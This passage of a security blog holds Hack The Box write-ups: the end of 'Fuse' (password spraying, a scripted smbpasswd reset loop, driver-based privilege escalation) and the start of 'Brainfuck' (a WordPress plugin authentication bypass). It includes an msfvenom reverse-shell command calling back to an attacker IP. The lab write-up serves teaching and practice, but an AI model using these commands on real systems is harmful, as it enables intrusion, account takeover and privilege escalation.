88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 10:34:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49754/tcp open  msrpc        Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-17T10:34:56
|_  start_date: 2022-08-17T10:14:17
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h32m59s, deviation: 4h02m30s, median: 12m58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2022-08-17T03:34:53-07:00
</code></pre></div></div>
<p>Spotting <strong>DNS, kerberos and LDAP</strong> is a <strong>dead giveaway</strong> of the box being <strong>a Domain Controller.</strong></p>

<p>Nmap’s <strong>version detection</strong> and <strong>default scripts</strong> give us good information:</p>
<ol>
  <li>The <strong>host name</strong> is <code class="language-plaintext highlighter-rouge">fuse</code></li>
  <li>It’s very likely <strong>Windows Server 2016</strong></li>
  <li>The <strong>domain name</strong> is <code class="language-plaintext highlighter-rouge">fabricorp.local</code></li>
</ol>

<p>we also know that <strong>WSMan is available on port 5985</strong> which <strong>is good if we get a user with PowerShell Remoting access.</strong></p>

<p>Let’s start enumeration!</p>

<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>We do the <strong>quick standard checks</strong> for <strong>null, guest and anonymous authentication:</strong></p>

<p><img src="/assets/Fuse/smb-enum.jpg" alt="" /></p>

<p>nothing there besides <strong>confirming OS version</strong> <code class="language-plaintext highlighter-rouge">Windows Server 2016 Standard 14393</code> and <strong>knowing the processor architecture:</strong> <code class="language-plaintext highlighter-rouge">x64</code></p>

<h2 id="rpc-enumeration">RPC Enumeration</h2>
<p>Our favourite <strong>RPC enumeration tool</strong> <a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a> didn’t yield much more information either.</p>

<p>We <strong>note down the Domain SID</strong> and move along.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> fuse
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... fuse
[*] Username ......... ''
[*] Random Username .. 'ujlfkgys'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ============================
|    Service Scan on fuse    |
 ============================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================
|    Domain Information via LDAP for fuse    |
 ============================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: fabricorp.local

 ============================================
|    NetBIOS Names and Workgroup for fuse    |
 ============================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =================================
|    SMB Dialect Check on fuse    |
 =================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: true
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: true

 =================================
|    RPC Session Check on fuse    |
 =================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===========================================
|    Domain Information via RPC for fuse    |
 ===========================================
[+] Domain: FABRICORP
[+] SID: S-1-5-21-2633719317-1471316042-3957863514
[+] Host is part of a domain (not a workgroup)

 ===================================================
|    Domain Information via SMB session for fuse    |
 ===================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FUSE
NetBIOS domain name: FABRICORP
DNS domain: fabricorp.local
FQDN: Fuse.fabricorp.local

 =======================================
|    OS Information via RPC for fuse    |
 =======================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server 2016 Standard 14393
OS version: '10.0'
OS release: '1607'
OS build: '14393'
Native OS: Windows Server 2016 Standard 14393
Native LAN manager: Windows Server 2016 Standard 6.3
Platform id: null
Server type: null
Server type string: null

 =============================
|    Users via RPC on fuse    |
 =============================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ==============================
|    Groups via RPC on fuse    |
 ==============================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ==============================
|    Shares via RPC on fuse    |
 ==============================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =================================
|    Policies via RPC for fuse    |
 =================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: STATUS_ACCESS_DENIED

 =================================
|    Printers via RPC for fuse    |
 =================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 24.97 seconds
</code></pre></div></div>

<h2 id="ldap-enumeration">LDAP Enumeration</h2>
<p>The same went for <strong>LDAP</strong>: <strong>anonymous bind</strong> isn’t enabled :/</p>

<p><img src="/assets/Fuse/no-ldap-anon.jpg" alt="" /></p>

<h2 id="the-website">The Website</h2>
<p><em>Having cleared away all the quick and simple checks,</em> it’s time to take a look at port 80.</p>

<p><img src="/assets/Fuse/website-homepage.jpg" alt="" /></p>

<p><em>Right off the bat,</em> we get <strong>redirected</strong> to <code class="language-plaintext highlighter-rouge">/papercut/logs/html/index.htm</code>.</p>

<p>we <strong>read the decription</strong> to know that <strong>live print logs are listed in the table below</strong> for us to check.</p>

<p><em>Checking the first one,</em> we see <strong>usernames</strong> as well as <strong>document</strong> and <strong>computer</strong> names.</p>

<p><img src="/assets/Fuse/print-log-page-1.jpg" alt="" /></p>

<p>We do the same for the 2nd and 3rd log pages.</p>

<p><img src="/assets/Fuse/print-log-page-2.jpg" alt="" /></p>

<p><img src="/assets/Fuse/print-log-page-3.jpg" alt="" /></p>

<p>Our <strong>notes</strong>:</p>
<ul>
  <li><strong>Usernames:</strong> pmerton, tlavel, bnielson, sthompson, bhult and administrator</li>
  <li><strong>Workstations:</strong> JUMP01, LONWK015, LONWK019, LAPTOP07 and of course FUSE</li>
</ul>

<p>And <strong>Document names</strong>:</p>
<ul>
  <li>New Starter - bnielson</li>
  <li>IT Budget Meeting Minutes</li>
  <li>backup_tapes</li>
  <li>mega_mountain_tape_request</li>
  <li><strong>Fabricorp01</strong></li>
  <li>offsite_dr_invocation</li>
  <li>printing_issue_test</li>
</ul>

<p>All document names <em>seem pretty normal</em>. Except for that <code class="language-plaintext highlighter-rouge">Fabricorp01</code> :D</p>

<p>A gut feeling is telling us: “That’s a password!” XD</p>

<p><em>And if it wasn’t,</em> it wouldn’t hurt to try <code class="language-plaintext highlighter-rouge">Fabricorp02</code>, <code class="language-plaintext highlighter-rouge">Fabricorp03</code> and so on…</p>

<h2 id="why-not-spray">Why not spray?</h2>
<p><em>Before delving into any password attacks,</em> we’re better off <strong>verifying the usernames we got</strong>. We’re going to use <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for that:</p>

<p><img src="/assets/Fuse/kerbrute-userenum.jpg" alt="" /></p>

<p><strong>Awesome! every single one of them was valid!</strong></p>

<p><em>Having a list of</em> <strong><em>valid usernames</em></strong> <em>and another with</em> <strong><em>potential passwords,</em></strong> we get to spraying..</p>

<p><img src="/assets/Fuse/likely-pass-list.jpg" alt="" /></p>

<p><img src="/assets/Fuse/password-spray-1.jpg" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">tlavel</code>, <code class="language-plaintext highlighter-rouge">bnielson</code> and <code class="language-plaintext highlighter-rouge">bhult</code> seem to have that password <code class="language-plaintext highlighter-rouge">Fabricorp01</code>. But it’s <strong><em>expired</em></strong>.</p>

<p>We need to find a way to reset it.</p>

<p><strong><em>RDP would’ve been nice here</em></strong>. But port 3389 isn’t open :/</p>

<p><em>After failing to reset the password dusing RPC’s</em> <code class="language-plaintext highlighter-rouge">setuserinfo2</code> <em>command</em>, we <strong>do some further research</strong> and <strong>come across a handy tool</strong> called <code class="language-plaintext highlighter-rouge">smbpasswd</code>.</p>

<p>It was <strong>built for administering Samba</strong> but <strong>Let’s take a look at its documentation:</strong></p>

<p><img src="/assets/Fuse/smbpasswd-docs.jpg" alt="" /></p>

<p><strong>Jackpot! This is exactly what we need</strong>. let’s see if it can do the job.</p>

<p><img src="/assets/Fuse/smbpasswd-change-pass.jpg" alt="" /></p>

<p>Awesome. We now <strong>have more room for enumeration</strong>.</p>

<h2 id="authenticated-information-gathering">Authenticated Information Gathering</h2>
<p><strong>Our access is now expanded with 3 users</strong>. We can try:</p>
<ol>
  <li><strong>Pulling the rest of the domain users</strong> and <strong>going for another</strong> <code class="language-plaintext highlighter-rouge">Fabricorp0X</code> <strong>spray</strong>.</li>
  <li><strong>Enumerating all the SMB share access</strong> to check what’s there.</li>
  <li><strong>Checking for WinRM access.</strong></li>
  <li>Doing a <strong>Bloodhound collection</strong> to see what’s <strong>Kerberoastable</strong>, what’s <strong>ASREPRoastable</strong>, <strong>who has access to what</strong> etc.</li>
</ol>

<p>And more.</p>

<p><em>However,</em> there’s an obstacle.</p>

<p><img src="/assets/Fuse/auto-reset-password-status.jpg" alt="" /></p>

<p><em>As explained in the image above,</em> something happens after we reset one user’s password. it changes back to what it was.</p>

<p>There’s <strong>automation</strong> going on. One that <strong>resets the password to the initial</strong> <code class="language-plaintext highlighter-rouge">Fabricorp01</code> <em>around every minute</em> and <strong>requires it to be changed.</strong></p>

<p><strong>To handle this and make our lives easier,</strong> we’ll have to <strong>come up with automation of our own</strong>. Let’s look up the help for the <code class="language-plaintext highlighter-rouge">smbpasswd</code> utility to see <strong>what options it offers:</strong></p>

<p><img src="/assets/Fuse/smbpasswd-help.jpg" alt="" /></p>

<p><em>Turns out that, with the help of the</em> <code class="language-plaintext highlighter-rouge">-s</code> <em>flag</em>, we can <strong>pass in passwords through</strong> <code class="language-plaintext highlighter-rouge">stdin</code>.</p>

<p>the old password + the new one + the confirmation would be fed to <code class="language-plaintext highlighter-rouge">smbpasswd</code> with a new line in between.</p>

<p><em>minding that</em> <strong>a new password must be given every time we do a reset</strong>. Because <strong>Active Directory</strong> <em>-by default-</em> <strong>remembers the last 24 passwords you used on a given account.</strong> A feature called <strong>“Password History”</strong>.</p>

<p>So it’s better to <strong>have the password as a command line argument</strong> for our script.</p>

<p>Here’s what it looks like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">for </span>user <span class="k">in</span> <span class="o">{</span><span class="s1">'tlavel'</span>,<span class="s1">'bnielson'</span>,<span class="s1">'bhult'</span><span class="o">}</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Fabricorp01</span><span class="se">\n</span><span class="nv">$1</span><span class="se">\n</span><span class="nv">$1</span><span class="s2">"</span> | smbpasswd <span class="nt">-r</span> fuse <span class="nt">-U</span> <span class="nv">$user</span> <span class="nt">-s</span>
        <span class="c"># any command we want to run with the new password before it gets reset</span>
<span class="k">done</span>
</code></pre></div></div>

<p>we’re targetting all the users there. Let’s <strong>check their SMB share access</strong> and <strong>if they can use WinRM</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cme winrm fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span>
cme smb fuse <span class="nt">-u</span> <span class="nv">$user</span> <span class="nt">-p</span> <span class="nv">$1</span> <span class="nt">--shares</span>
</code></pre></div></div>

<p><img src="/assets/Fuse/automated-pass-reset.jpg" alt="" /></p>

<p>The script ran well. <em>However,</em> <strong>none of the users had WinRM access</strong> and <strong>we didn’t find anything valuable in the SMB shares</strong> when we checked.</p>

<p><em>To prepare for a</em> <strong><em>full domain password spray,</em></strong> We <strong>modify the script</strong> to <strong>target only one user</strong> and <strong>pull all the domain users</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>

<p><img src="/assets/Fuse/getting-all-ad-users.jpg" alt="" /></p>

<p>We target all the remaining users with <code class="language-plaintext highlighter-rouge">Fabricorp01</code> through <code class="language-plaintext highlighter-rouge">Fabricorp09</code> but with no success :/</p>

<p><img src="/assets/Fuse/2nd-password-spray.jpg" alt="" /></p>

<h2 id="ad-enumeration-with-bloodhound">AD Enumeration with Bloodhound</h2>
<p>We do a <code class="language-plaintext highlighter-rouge">BloodHound</code> collection from our Kali using <a href="https://github.com/fox-it/BloodHound.py">Bloodhound.py</a>. But don’t find anything exploitable with any of our owned users.</p>

<p><em>However, since the number of the users in the domain is relatively small,</em> we <strong>inspected everyone up close.</strong></p>

<p>Until we found <code class="language-plaintext highlighter-rouge">svc-print</code>…</p>

<p><img src="/assets/Fuse/svc-print-privs.jpg" alt="" /></p>

<p>This account <strong>is our target</strong> to <strong>take over the domain.</strong></p>

<p>Because it can:</p>
<ol>
  <li><strong>Gain a remote shell onto the Domain Controller</strong> (since <strong>it’s part of the “Remote Management Users”</strong> group)</li>
  <li><strong>Perform privilege escalation</strong> by <strong>abusing the</strong> <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> (a privilege <strong>held by all members of the “Print Operators” group</strong>) to <strong>load malicious drivers into the kernel.</strong></li>
</ol>

<p><em>Right now,</em> <strong>all of our attention is directed towards obtaining access to this account.</strong></p>

<h2 id="printer-enumeration">Printer Enumeration</h2>
<p><em>Since printers have been mentioned way too many times in this machine</em> (the <strong>website</strong>, <strong>SMB shares</strong> and in <strong>BloodHound</strong>), we have to <strong>do decent enumeration</strong> on them.</p>

<p>We can do that <strong>via RPC</strong> with a valid account.</p>

<p>Let’s <strong>re-run</strong> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> <strong>with credentials this time</strong> and see what comes up.</p>

<p><img src="/assets/Fuse/rpc-printer-enumeration.jpg" alt="" /></p>

<p>A <strong>password was there in the description</strong> :D</p>

<p>we should’ve redone this part after obtaining those users. Oh well :/</p>

<p><em>Naturally,</em> we <strong>spray that password</strong>. To find both <code class="language-plaintext highlighter-rouge">svc-print</code> and <code class="language-plaintext highlighter-rouge">svc-scan</code> using it.</p>

<p>We used <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to get on the box and <strong>ignored</strong> <code class="language-plaintext highlighter-rouge">svc-scan</code> <em>since it doesn’t hold any special privileges..</em></p>

<p><img src="/assets/Fuse/print-pass-worked.jpg" alt="" /></p>

<p><em>With this access,</em> it’s time for some <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> abuse.</p>

<p><img src="/assets/Fuse/se-load-driver-priv.jpg" alt="" /></p>

<h2 id="evil-driver-pwnage">Evil Driver Pwnage</h2>
<p>The amazing <a href="https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">article</a> by <strong>Tarlogic Cybersecurity</strong> explains the <strong>theory</strong> and details <strong>the steps of exploitation</strong>. Give it a read for the full picture.</p>

<p><em>But, in short,</em> what we’re going to do is:</p>
<ul>
  <li><strong>Download a vulnerable driver</strong> (<code class="language-plaintext highlighter-rouge">Capcom.sys</code>) <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">here</a>. <em>-And, yes, it’s the game company :D-</em> <strong>we’re deliberately using it because it can be exploited for Privesc</strong>.</li>
  <li><strong>Load it into the kernel</strong> with our held privilege using <strong>Tarlogic’s</strong> <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a> tool</li>
  <li><strong>Exploit the driver</strong> using the public exploit from <strong>Tandasat</strong> <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> <em>(after making a few modifications to its code)</em>.</li>
</ul>

<p><em>After downloading</em> <code class="language-plaintext highlighter-rouge">Capcom.sys</code>, we compile the <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> using <strong>Visual Studio</strong></p>

<p>Then <strong>modify</strong> the <code class="language-plaintext highlighter-rouge">ExploitCapcom</code> code before compiling it to <strong>run a reverse shell executable</strong> <code class="language-plaintext highlighter-rouge">rev.exe</code> <em>(instead of launching cmd.exe)</em></p>

<p><img src="/assets/Fuse/modifying-exploit-capcom.jpg" alt="" /></p>

<p>And <strong>generate the reverse shell</strong> using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> exe <span class="o">&gt;</span> rev.exe
</code></pre></div></div>

<p>We <strong>pack the 4 items into an archive</strong> and <strong>upload it to the victim</strong></p>

<p><img src="/assets/Fuse/uploading-exploit-items.jpg" alt="" /></p>

<p><em>Now locked and loaded,</em> we move <code class="language-plaintext highlighter-rouge">rev.exe</code> back one directory to be in <code class="language-plaintext highlighter-rouge">C:\Users\svc-print\Documents</code> <em>(matching the path specified in the</em> <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> <em>executable)</em></p>

<p>And proceed to <strong>load</strong> <code class="language-plaintext highlighter-rouge">Capcom.sys</code> into the <em>writable</em> <code class="language-plaintext highlighter-rouge">HKCU:\System\CurrentControlSet</code> <strong>registry path</strong> using <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> and naming it <code class="language-plaintext highlighter-rouge">KillerDriver</code> for dramatic effect XD</p>

<p><em>With the driver now in the kernel,</em> we <strong>exploit it</strong> with <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> which <strong>runs</strong> the <code class="language-plaintext highlighter-rouge">rev.exe</code> to <strong>give us a nice reverse shell :D</strong></p>

<p><img src="/assets/Fuse/killer-driver.jpg" alt="" /></p>

<p><strong><em>I guess we blew up a FUSE :P</em></strong></p>

<p><strong>…</strong></p>

<p><strong>Ahem! It was a good box :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Insane] - Brainfuck</title><link href="http://localhost:4000/2022/08/17/Brainfuck.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Insane] - Brainfuck" /><published>2022-08-17T00:00:00+02:00</published><updated>2022-08-17T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/17/Brainfuck</id><content type="html" xml:base="http://localhost:4000/2022/08/17/Brainfuck.html"><![CDATA[<p><img src="/assets/Brainfuck/Brainfuck.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>A <strong>Linux</strong> box where we find <strong>email ports (SMTP/POP/IMAP)</strong> open as well as <strong>two HTTPS websites</strong> (we discovered them from the <strong>SSL certificate Subject Alternative Name</strong> field)</li>
  <li>One website had a <strong>Wordpress blog</strong> which happened to have a <strong><em>vulnerable component</em></strong> that enabled us to impersonate the <code class="language-plaintext highlighter-rouge">admin</code> user.</li>
  <li><em>After failing to get code execution using traditional ways</em> (<strong><em>editing Wordpress themes and uploading malicious plugins</em></strong>), we search more to <strong>find email credentials for the <code class="language-plaintext highlighter-rouge">orestis</code> user in the installed SMTP plugin.</strong></li>
  <li>We <strong>configure a mail client with IMAP</strong> and <strong>retrieve the mailbox contents</strong> for the <code class="language-plaintext highlighter-rouge">orestis</code> user to <strong>gain another set of credentials for the other website (a forum)</strong>.</li>
  <li><em>After logging in,</em> <strong>we find an accouncement</strong> where the <code class="language-plaintext highlighter-rouge">administrator</code> <strong>mentions that SSH password-based authentication has been disabled in favor of key-based login.</strong></li>
  <li><em>Since the <code class="language-plaintext highlighter-rouge">orestis</code> user</em> <strong><em>lost his key</em></strong>, he is now <strong>locked out</strong> and <strong>is looking to get his key for access.</strong></li>
  <li>The <code class="language-plaintext highlighter-rouge">administrator</code> says <strong>he won’t provide the SSH key in the discussion thread because it would be visible to all forum members</strong>. So they <strong>switch over to an encrypted one</strong>.</li>
  <li><em>Looking at the</em> <strong>cipher text</strong> <em>on that thread</em>, we <strong>do some research to recognize the cipher in use</strong>. We find out it’s a <strong>Vigenere Cipher</strong> and <strong><em>are able to figure out the key.</em></strong></li>
  <li><em>After</em> <strong><em>decrypting the messages on the thread</em></strong>, <strong>we get a URL for a passphrase-protected SSH key</strong>. One we crack using <code class="language-plaintext highlighter-rouge">john</code>.</li>
  <li>We finally login as the <code class="language-plaintext highlighter-rouge">orestis</code> user to find out <strong>he’s a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group</strong>. <strong>This enables us to escalate our privileges to <code class="language-plaintext highlighter-rouge">root</code> due the insecure features of LXD.</strong></li>
</ul>

<hr />

<h2 id="nmap-for-the-roadmap">NMAP for the roadmap</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login Pre-login IMAP4rev1 have LOGIN-REFERRALS ID capabilities IDLE more OK SASL-IR ENABLE AUTH=PLAINA0001 listed LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p><strong><em>Looking at the nmap scan results</em></strong>, we notice:</p>
<ol>
  <li><strong>SSH version &lt; 7.7</strong> which <strong>allows for user enumeration</strong> (<em>we might need that to confirm some users’ existence on the box</em>)</li>
  <li><strong>Mail ports: 25, 110 &amp; 143 for SMTP, POP and IMAP</strong> (<strong>SMTP</strong> = we <strong>can send malicious emails</strong> and <strong>launch client-side attacks</strong> while <strong>IMAP</strong> and <strong>POP3</strong> can <strong>give us access to user mailboxes if we have credentials</strong>)</li>
  <li><strong>HTTPS</strong> on port 443 is a nice <strong>web-based attack surface</strong> for us to explore</li>
</ol>

<p>But we notice that the <strong>nmap default script</strong> gave us <strong>a couple of host names</strong> in the <code class="language-plaintext highlighter-rouge">commonName</code> and <code class="language-plaintext highlighter-rouge">Subject Alternative Name</code> fields:</p>
<ul>
  <li><strong>brainfuck.htb</strong></li>
  <li><strong>www.brainfuck.htb</strong></li>
  <li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
</ul>

<p><strong>We add those to our</strong> <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<p><img src="/assets/Brainfuck/setting-etc-hosts.jpg" alt="" /></p>

<h2 id="checking-out-the-websites">Checking out the websites</h2>
<p>We take a look at <strong>www.brainfuck.htb</strong> to find a <strong>Wordpress blog</strong></p>

<p><img src="/assets/Brainfuck/wordpress-first-look.jpg" alt="" /></p>

<p><strong>It’s rich with information:</strong></p>
<ol>
  <li>we find <strong>two usernames</strong>: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">orestis</code></li>
  <li>we find <strong>a note about integration with SMTP</strong>. <em>Possibly a</em> <strong><em>hint</em></strong></li>
  <li>we notice <strong>a link to “open a ticket”</strong>. This could be a <strong>Wordpress plugin</strong> with exploitable functionalities.</li>
</ol>

<h2 id="enumerating-wordpress">Enumerating Wordpress</h2>
<p><em>At this point,</em> it’s both a <strong><em>quick and easy check</em></strong> to run <code class="language-plaintext highlighter-rouge">wpscan</code>. It’s <strong>specialized for scanning Wordpress</strong> and <strong>would give us tons of information on it</strong>.</p>

<p><strong><em>Running it like below:</em></strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> https://brainfuck.htb/ <span class="nt">-e</span> ap,at,tt,cb,dbe,u <span class="nt">--disable-tls-checks</span>
</code></pre></div></div>

<p>would enable us to <strong>enumerate</strong> (<code class="language-plaintext highlighter-rouge">-e</code>):</p>
<ul>
  <li>All plugins <code class="language-plaintext highlighter-rouge">ap</code></li>
  <li>All themes <code class="language-plaintext highlighter-rouge">at</code></li>
  <li>Timthumbs <code class="language-plaintext highlighter-rouge">tt</code></li>
  <li>Config backups <code class="language-plaintext highlighter-rouge">cb</code></li>
  <li>Database exports <code class="language-plaintext highlighter-rouge">dbe</code></li>
  <li>And, Wordpress users <code class="language-plaintext highlighter-rouge">u</code></li>
</ul>

<p><em>Looking at the results,</em> we find <strong>something interesting:</strong></p>

<p><img src="/assets/Brainfuck/wp-plugin-discovered.jpg" alt="" /></p>

<p>We do a search on <a href="/assets/Brainfuck/https://www.exploit-db.com/">Exploit-DB</a> to find that <strong>there is couple of verified exploits that match the version we have</strong>:</p>

<p><img src="/assets/Brainfuck/exploit-db-plugin.jpg" alt="" /></p>

<p><em>At first,</em> we check out <strong>the SQL injection one</strong>. But we find out that <strong>it requires at least one valid user</strong>:</p>

<p><img src="/assets/Brainfuck/vuln1-user-access-required.jpg" alt="" /></p>

<p><em>Luckily however,</em> the second one <strong>doesn’t require authentication:</strong></p>

<p><img src="/assets/Brainfuck/vuln2-user-access-not-required.jpg" alt="" /></p>

<p>And <strong>the PoC seems straightforward</strong>. Just a <strong>form we have to submit:</strong></p>

<p><img src="/assets/Brainfuck/vuln2-poc.jpg" alt="" /></p>

<p>We <strong>edit the exploit</strong> to <strong>match the Wordpress URL</strong> like below:</p>

<p><img src="/assets/Brainfuck/html-exploit-edited.jpg" alt="" /></p>

<p>And <strong>open the html with Firefox:</strong></p>

<p><img src="/assets/Brainfuck/html-exploit-firefox.jpg" alt="" /></p>

<p><em>After submitting the form,</em> we notice that <strong>the response gives us a bunch of cookies</strong></p>

<p><img src="/assets/Brainfuck/exploit-request-and-response.jpg" alt="" /></p>

<p>And we <strong>confirm that the exploit works</strong> after visiting the <strong>website’s main page and finding a session with <code class="language-plaintext highlighter-rouge">administrator</code></strong></p>

<p><img src="/assets/Brainfuck/html-exploit-working.jpg" alt="" /></p>

<p><strong>Great!</strong> <em>but even though the exploit worked</em>, the <code class="language-plaintext highlighter-rouge">administrator</code> user <strong><em>didn’t have much access.</em></strong></p>

<p><img src="/assets/Brainfuck/wp-administrator-low-access.jpg" alt="" /></p>

<p><strong><em>Knowing of the other</em></strong> <code class="language-plaintext highlighter-rouge">admin</code> <strong><em>user from both the homepage and</em></strong> <code class="language-plaintext highlighter-rouge">wpscan</code>, we <strong>used the exploit to gain access with the</strong> <code class="language-plaintext highlighter-rouge">admin</code> <strong>user instead.</strong></p>

<p><img src="/assets/Brainfuck/wp-found-users.jpg" alt="" /></p>

